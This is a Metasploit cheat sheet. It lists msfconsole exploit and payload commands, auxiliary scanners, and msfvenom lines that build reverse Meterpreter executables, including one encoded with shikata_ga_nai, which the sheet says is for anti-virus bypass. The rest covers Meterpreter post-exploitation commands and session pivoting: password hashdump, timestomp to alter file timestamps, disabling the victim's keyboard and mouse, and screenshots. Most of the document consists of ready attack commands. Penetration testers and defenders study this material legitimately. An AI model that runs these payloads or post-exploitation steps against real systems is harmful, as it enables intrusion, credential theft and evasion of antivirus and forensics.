Metasploit Cheat Sheet
======================

--------------

Metasploit Project is a computer security project which provide
information about vulnerabilities. Help in the development of
penetration tests and IDS signatures, metasploit is very popular tool
used by pentest experts.

Metasploit :
~~~~~~~~~~~~

-  Search for module:
                     

.. code:: bash

    msf > search [regex]

-  Specify and exploit to use:
                              

.. code:: bash

    msf > use exploit/[ExploitPath]

-  Specify a Payload to use:
                            

.. code:: bash

    msf > set PAYLOAD [PayloadPath]

-  Show options for the current modules:
                                        

.. code:: bash

    msf > show options

-  Set options:
               

.. code:: bash

    msf > set [Option] [Value]

-  Start exploit:
                 

.. code:: bash

    msf > exploit 

--------------

Useful Auxiliary Modules
~~~~~~~~~~~~~~~~~~~~~~~~

-  Port Scanner:
                

.. code:: bash

    msf > use auxiliary/scanner/portscan/tcp
    msf > set RHOSTS 192.168.10.0/24
    msf > run

-  DNS Enumeration:
                   

.. code:: bash

    msf > use auxiliary/gather/dns_enum
    msf > set DOMAIN target.tgt
    msf > run

-  FTP Server:
              

.. code:: bash

    msf > use auxiliary/server/ftp
    msf > set FTPROOT /tmp/ftproot
    msf > run

-  Proxy Server:
                

.. code:: bash

    msf > use auxiliary/server/socks4
    msf > run 

--------------

msfvenom :
~~~~~~~~~~

msfvenom this is tool can be used to generate Metasploit payloads as
standalone files and optionally encode them. This tool replaces
``msfpayload`` and ``msfencode`` tools. Run with ‘'-l payloads’ to get a
list of payloads.

.. code:: bash

    $ msfvenom –p [PayloadPath]
    –f [FormatType]
    LHOST=[LocalHost (if reverse conn.)]
    LPORT=[LocalPort]

-  Example: Reverse Meterpreter payload as an executable and redirected into a file:
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

.. code:: bash

    $ msfvenom -p windows/meterpreter/
    reverse_tcp -f exe LHOST=192.168.1.1
    LPORT=4444 > met.exe

-  Format Options **(specified with –f)** --help-formats – List available output formats
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

   -  ``-exe`` – Executable
   -  ``-pl`` – Perl
   -  ``-rb`` – Ruby
   -  ``-raw`` – Raw shellcode
   -  ``-c`` – C code

-  Encoding Payloads with msfvenom
   '''''''''''''''''''''''''''''''

msfvenom can be used to apply a level of encoding for anti-virus bypass.
For example run msfvenom with ``-l encoders`` to get a list of encoders.

.. code:: bash

    $ msfvenom -p [Payload] -e [Encoder] -f
    [FormatType] -i [EncodeInterations]
    LHOST=[LocalHost (if reverse conn.)]
    LPORT=[LocalPort]

-  Example: Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

.. code:: bash

    $ msfvenom -p windows/meterpreter/
    reverse_tcp -i 5 -e x86/shikata_ga_nai -f
    exe LHOST=192.168.1.1 LPORT=4444 > mal.exe

--------------

Metasploit Meterpreter
~~~~~~~~~~~~~~~~~~~~~~

-  Base Commands:
   ''''''''''''''

   -  ``? / help`` : Display a summary of commands exit / quit: Exit the
      Meterpreter session

   -  ``sysinfo``: Show the system name and OS type

   -  ``shutdown / reboot`` : Self-explanatory

-  File System Commands:
   '''''''''''''''''''''

   -  ``cd`` : Change directory

   -  ``lcd`` : Change directory on local (attacker's) machine

   -  ``pwd / getwd`` : Display current working directory

   -  ``ls`` : Show the contents of the directory

   -  ``cat`` : Display the contents of a file on screen

   -  ``download / upload`` : Move files to/from the target machine

   -  ``mkdir / rmdir`` : Make / remove directory

   -  ``edit`` : Open a file in the default editor (typically vi)

-  Process Commands:
   '''''''''''''''''

   -  ``getpid`` : Display the process ID that Meterpreter is running
      inside.

   -  ``getuid`` : Display the user ID that Meterpreter is running with.

   -  ``ps`` : Display process list.

   -  ``kill`` : Terminate a process given its process ID.

   -  ``execute`` : Run a given program with the privileges of the
      process the Meterpreter is loaded in.

   -  ``migrate`` : Jump to a given destination process ID

-  Network Commands:
   '''''''''''''''''

   -  ``ipconfig`` : Show network interface information

   -  ``portfwd`` : Forward packets through TCP session

   -  ``route`` : Manage/view the system's routing table

-  Other Commands:
   '''''''''''''''

   -  ``idletime``: Display the duration that the GUI of thetarget
      machine has been idle.

   -  ``uictl [enable/disable] [keyboard/mouse]`` : Enable/disable
      either the mouse or keyboard of the target machine.

   -  ``screenshot`` : Save as an image a screenshot of the target
      machine.

-  Additional Modules:
   '''''''''''''''''''

   -  ``use [module]`` : Load the specified module

   -  **Examples**:

      -  ``use priv`` : Load the priv module

      -  ``hashdump`` : Dump the hashes from the box

      -  ``timestomp`` : Alter NTFS file timestamps

--------------

Managing Sessions
~~~~~~~~~~~~~~~~~

Multiple Exploitation:
''''''''''''''''''''''

-  Run the exploit expecting a single session that is immediately backgrounded:
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

.. code:: bash

    msf > exploit -z

-  Run the exploit in the background expecting one or more sessions that are immediately backgrounded:
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

.. code:: bash

    msf > exploit –j

-  List all current jobs ``exploit listeners``:
   ''''''''''''''''''''''''''''''''''''''''''''

.. code:: bash

    msf > jobs –l

-  Kill a job:
   '''''''''''

.. code:: bash

    msf > jobs –k [JobID]

Multiple Sessions:
''''''''''''''''''

-  List all backgrounded sessions:
   '''''''''''''''''''''''''''''''

.. code:: bash

    msf > sessions -l

-  Interact with a backgrounded session:
   '''''''''''''''''''''''''''''''''''''

.. code:: bash

    msf > session -i [SessionID]

-  Background the current interactive session:
   '''''''''''''''''''''''''''''''''''''''''''

.. code:: bash

    meterpreter > <Ctrl+Z>

or

.. code:: bash

    meterpreter > background

-  Routing Through Sessions:
   '''''''''''''''''''''''''

All modules against the target subnet mask will be pivoted through this
session.

.. code:: bash

    msf > route add [Subnet to Route To]
    [Subnet Netmask] [SessionID]

--------------
